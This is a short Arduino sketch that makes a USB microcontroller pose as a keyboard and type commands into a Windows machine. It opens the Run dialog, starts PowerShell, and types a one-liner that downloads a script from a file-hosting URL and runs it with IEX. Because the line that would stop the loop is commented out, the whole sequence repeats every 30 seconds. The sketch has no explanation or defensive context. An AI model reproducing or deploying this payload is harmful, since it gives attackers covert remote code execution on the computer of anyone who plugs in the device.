#include "HID-Project.h"

int i = 1;

void setup(){
  Keyboard.begin();
  delay(500);
}

void loop(){
  if (i==1) {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_R);
    Keyboard.releaseAll();
    delay(500);
    
    Keyboard.println("C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe");
    delay(500);
    
    Keyboard.println("IEX (New-Object Net.WebClient).DownloadString('https://cdn-03.anonfile.com/b234wbc7b5/156ef47c-1504939704/asdf.ps1');");

    //i=0
  }
  delay(30000);
}
 
